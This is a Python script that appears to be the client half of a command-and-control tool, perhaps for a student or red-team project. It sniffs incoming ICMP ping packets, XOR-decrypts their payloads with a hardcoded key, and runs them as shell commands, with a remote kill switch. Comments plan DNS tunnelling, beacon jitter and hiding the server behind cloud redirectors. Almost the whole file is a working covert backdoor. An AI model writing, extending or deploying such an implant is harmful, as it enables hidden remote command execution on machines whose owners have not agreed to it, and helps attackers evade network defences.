#!/usr/bin/env python3

# TODO implement DNS packet transfering with scapy, packet crafting
# TODO Later: implement some jitter for client/beacon traffic sleeping assuming we have a sendback MAYBE / not sure how applicable it is here??
# Look into platform as a service things (for the waaay future) for getting rnadom domains it would point to a cloud machine (university envir could be on the cloud) with firewall rules then the c2 server is behind the cloud machine
from scapy.all import AsyncSniffer, Packet
import subprocess
import os
import re
import argparse
from time import sleep

key = "ringring"
debug = False


def decrypt(ciphertext):
    """
    Decrypt a message encrypted with the XOR cipher with the given key.
    """
    key_bytes = key.encode()
    message = bytearray()
    for i, b in enumerate(bytes.fromhex(ciphertext)):
        message.append(b ^ key_bytes[i % len(key_bytes)])
    return message.decode()


def sniffHandle(packet: Packet) -> None:
    """Gets called every time a packet from the sniffer is sent, as of right now it prints the payload of the packet"""
    try:
        # packet[3] is the raw layer that contains that data passed into the ping command
        decodedCommand = decrypt(packet[3].load.decode())
        print(decodedCommand)

        # checks if the user passed in the cd command
        # regex: ^: start of line + cd + \s: whitespace + (.*): group one of anything aka a command + $: end of line
        cd_match = re.match(r"^cd\s*(.*)$", decodedCommand)

        if decodedCommand == "kill":
            raise Exception("Programmed killed by server")
        # this is what the windows ping utility passes for data
        elif decodedCommand == "abcdefghijklmnopqrstuvwabcdefghi":
            pass
        elif cd_match:
            path = cd_match.group(1)
            os.chdir(path=path)
        else:
            subprocess.run(decodedCommand, shell=True, capture_output=not debug)
    # the linux ping command passes some weird format in the raw load so this is to catch it, ultimately it doesn't matter if catch it
    except UnicodeDecodeError:
        print("Oh well")


def sniffer() -> None:
    """Starts an asynchronus sniffer then allows for the program to be interrupted"""
    sniffer = AsyncSniffer(filter="icmp[icmptype]=8", prn=sniffHandle)

    print("[*] Start sniffing...")
    sniffer.start()

    try:
        # TODO find a way to make this betterer
        while True:
            sleep(1)
    except KeyboardInterrupt:
        print("[*] Stop sniffing")
        sniffer.stop()


def main() -> None:
    """Runs the client handling the packets"""
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--debug", action="store_true", help="Enable debug mode")
    args = parser.parse_args()

    # Check if the debug flag is set
    if args.debug:
        global debug
        debug = True

    sniffer()


if __name__ == "__main__":
    main()
